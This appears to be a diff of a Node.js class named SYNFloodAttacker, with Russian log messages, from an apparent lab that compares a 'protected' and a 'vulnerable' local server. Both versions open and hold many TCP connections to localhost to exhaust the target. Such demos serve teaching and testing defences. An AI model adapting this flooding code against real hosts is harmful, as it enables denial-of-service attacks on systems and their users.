@@ -2,111 +2,61 @@ const net = require('net');
 const log = require('../utils/logger');
 
 class SYNFloodAttacker {
-  constructor(targetPort = 8080, targetHost = 'localhost') {
-    this.targetPort = targetPort;
-    this.targetHost = targetHost;
-    this.connections = [];
-    this.attackInterval = null;
-    this.stats = {
-      attempted: 0,
-      successful: 0,
-      rejected: 0
-    };
-  }
-
-  startAttack(count = 100, delay = 10) {
-    log.section(`ЗАПУСК SYN FLOOD АТАКИ`);
-    log.attack(`Цель: ${this.targetHost}:${this.targetPort}`);
-    log.attack(`Количество попыток: ${count}`);
-    log.attack(`Интервал: ${delay}мс`);
-
-    let attempts = 0;
-
-    this.attackInterval = setInterval(() => {
-      if (attempts >= count) {
-        this.stopAttack();
-        return;
-      }
-
-      this.performSynAttempt(attempts);
-      attempts++;
-      this.stats.attempted++;
-
-    }, delay);
-  }
-
-  performSynAttempt(id) {
-    const socket = new net.Socket();
-
-    socket.connect(this.targetPort, this.targetHost, () => {
-      log.attack(`[SYN ${id}] Соединение установлено, держим открытым...`);
-      this.stats.successful++;
-
-      this.connections.push(socket);
-    });
-
-    socket.on('error', (err) => {
-      if (err.code === 'ECONNREFUSED') {
-        log.attack(`[SYN ${id}] Соединение отклонено сервером (ЗАЩИТА СРАБОТАЛА!)`);
-      } else if (err.code === 'ETIMEDOUT') {
-        log.attack(`[SYN ${id}] Таймаут соединения (ЗАЩИТА СРАБОТАЛА!)`);
-      } else {
-        log.attack(`[SYN ${id}] Ошибка: ${err.code}`);
-      }
-      this.stats.rejected++;
-    });
-
-    socket.setTimeout(60000);
-  }
-
-  stopAttack() {
-    if (this.attackInterval) {
-      clearInterval(this.attackInterval);
-      this.attackInterval = null;
+    constructor(targetPort = 8080) {
+        this.targetPort = targetPort;
+        this.connections = [];
+        this.interval = null;
+        this.count = 0;
     }
 
-    log.section('РЕЗУЛЬТАТЫ SYN FLOOD АТАКИ');
-    log.attack(`Всего попыток: ${this.stats.attempted}`);
-    log.attack(`Успешных соединений: ${this.stats.successful}`);
-    log.attack(`Отклонено/сброшено: ${this.stats.rejected}`);
+    startAttack(total = 30, delay = 50) {
+        const type = this.targetPort === 8080 ? 'ЗАЩИЩЕННЫЙ' : 'УЯЗВИМЫЙ';
+        log.section(`SYN FLOOD АТАКА НА ${type} СЕРВЕР`);
+        log.attack(`Порт: ${this.targetPort}, попыток: ${total}`);
+        
+        this.interval = setInterval(() => {
+            if (this.count >= total) {
+                log.attack(`Создано ${this.connections.length} соединений`);
+                return;
+            }
+            
+            const socket = new net.Socket();
+            socket.connect(this.targetPort, 'localhost', () => {
+                this.connections.push(socket);
+                this.count++;
+                log.attack(`[${this.count}] СОЕДИНЕНИЕ УСТАНОВЛЕНО (всего активно: ${this.connections.length})`);
+                
 
-    if (this.targetPort === 8081) {
-      if (this.stats.rejected === 0) {
-        log.warn('Уязвимый сервер НЕ ИМЕЕТ защиты от SYN Flood!');
-      } else {
-        log.success('Странно, но уязвимый сервер что-то блокирует');
-      }
-    } else {
-      if (this.stats.rejected > 0) {
-        log.success('Защищенный сервер УСПЕШНО блокирует SYN Flood атаку!');
-      } else {
-        log.warn('Защищенный сервер НЕ справляется с SYN Flood атакой!');
-      }
+            });
+            
+            socket.on('error', (err) => {
+                if (err.code === 'ECONNRESET') {
+                    log.attack(`СОЕДИНЕНИЕ СБРОШЕНО (ЗАЩИТА)`);
+                    const index = this.connections.indexOf(socket);
+                    if (index > -1) this.connections.splice(index, 1);
+                }
+            });
+        }, delay);
     }
-  }
-
-  closeAllConnections() {
-    this.connections.forEach(socket => {
-      socket.destroy();
-    });
-    this.connections = [];
-    log.attack('Все соединения закрыты');
-  }
+    
+    stopAttack() {
+        if (this.interval) clearInterval(this.interval);
+        log.attack(`🛑 Закрываю ${this.connections.length} соединений...`);
+        this.connections.forEach(s => s.destroy());
+        this.connections = [];
+        log.attack(`🛑 Атака остановлена`);
+    }
 }
 
 if (require.main === module) {
-  const attacker = new SYNFloodAttacker(8080);
-
-  attacker.startAttack(50, 20);
-
-  setTimeout(() => {
-    attacker.stopAttack();
-    attacker.closeAllConnections();
-  }, 7000);
-
-  // Для атаки на уязвимый сервер (порт 8081):
-  // const attacker2 = new SYNFloodAttacker(8081);
-  // attacker2.startAttack(50, 20);
+    const port = process.argv[2] ? parseInt(process.argv[2]) : 8080;
+    const attacker = new SYNFloodAttacker(port);
+    attacker.startAttack(30, 50);
+    
+    process.on('SIGINT', () => {
+        attacker.stopAttack();
+        process.exit();
+    });
 }
 
 module.exports = SYNFloodAttacker;
